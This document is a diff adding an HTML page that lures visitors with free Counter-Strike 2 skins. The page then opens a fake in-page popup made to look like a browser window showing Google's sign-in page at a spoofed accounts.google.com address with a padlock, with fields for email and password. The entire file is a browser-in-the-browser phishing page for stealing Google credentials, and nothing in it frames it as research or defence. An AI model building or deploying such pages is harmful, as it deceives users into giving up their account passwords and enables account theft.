@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Free CS2 skins — claim now</title>
+<style>
+  body { margin: 0; font-family: Arial, sans-serif; background: #12131a; color: #eee; }
+  .hero { padding: 80px 40px; text-align: center; }
+  .claim { background: #f5a623; border: 0; padding: 14px 30px; font-size: 18px; border-radius: 6px; }
+  /* The fake popup: a positioned box that imitates a browser window. */
+  .win { position: fixed; top: 80px; left: calc(50% - 230px); width: 460px; height: 520px; background: #fff; color: #202124; border-radius: 8px; box-shadow: 0 20px 60px rgba(0,0,0,.5); overflow: hidden; }
+  .bar { background: #dee1e6; padding: 8px 10px; display: flex; gap: 6px; align-items: center; }
+  .dot { width: 12px; height: 12px; border-radius: 50%; background: #ff5f57; display: inline-block; }
+  .url { flex: 1; background: #fff; border-radius: 12px; padding: 4px 12px; font-size: 13px; color: #3c4043; }
+  .body { padding: 36px; }
+  input { display: block; width: 100%; box-sizing: border-box; padding: 12px; margin: 12px 0; border: 1px solid #dadce0; border-radius: 4px; }
+</style></head>
+<body>
+  <div class="hero"><h1>Claim 3 free skins</h1><p>Sign in with Google to receive your items.</p><button class="claim">Claim with Google</button></div>
+  <div class="win" role="dialog">
+    <div class="bar"><span class="dot"></span><span class="dot" style="background:#febc2e"></span><span class="dot" style="background:#28c840"></span>
+      <span class="url">🔒 https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn</span></div>
+    <div class="body">
+      <h2>Sign in</h2><p>Use your Google Account</p>
+      <input type="email" placeholder="Email or phone">
+      <input type="password" placeholder="Enter your password">
+      <button>Next</button>
+    </div>
+  </div>
+</body></html>
